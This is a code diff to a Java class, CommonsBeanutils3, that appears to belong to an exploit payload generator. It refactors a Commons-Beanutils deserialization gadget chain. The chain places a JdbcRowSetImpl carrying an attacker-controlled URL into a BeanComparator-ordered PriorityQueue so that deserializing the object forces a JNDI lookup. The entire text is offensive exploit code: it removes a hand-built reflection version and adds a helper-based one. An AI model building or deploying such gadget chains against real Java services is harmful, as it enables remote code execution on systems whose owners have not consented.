@@ -9,12 +9,10 @@ import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
-import com.ppp.utils.Reflections;
 import com.sun.rowset.JdbcRowSetImpl;
-import org.apache.commons.beanutils.BeanComparator;
 
 import java.math.BigInteger;
-import java.util.PriorityQueue;
+import java.util.Comparator;
 
 /**
  * @author Whoopsunix
@@ -42,30 +40,18 @@ public class CommonsBeanutils3 implements ObjectPayload<Object> {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain(sinkObject);
+        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());
 
         return kickOffObject;
     }
 
-    public Object getChain(Object url) throws Exception {
+    public Object getChain(Object url, CBVersionEnum version) throws Exception {
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
         jdbcRowSet.setDataSourceName((String) url);
         jdbcRowSet.setMatchColumn("x");
-        // mock method name until armed
-        final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
-        // create queue with numbers and basic comparator
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        // stub data for replacement later
-        queue.add(new BigInteger("1"));
-        queue.add(new BigInteger("1"));
+        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.BeanComparator, version);
 
-        // switch method called by comparator
-        Reflections.setFieldValue(comparator, "property", "databaseMetaData");
-
-        // switch contents of queue
-        Reflections.setFieldValue(queue, "queue", new Object[]{jdbcRowSet, jdbcRowSet});
-
-        return queue;
+        return BeanComparatorBuilder.queueGadgetMaker(comparator, jdbcRowSet, new BigInteger("1"), "databaseMetaData");
     }
 }
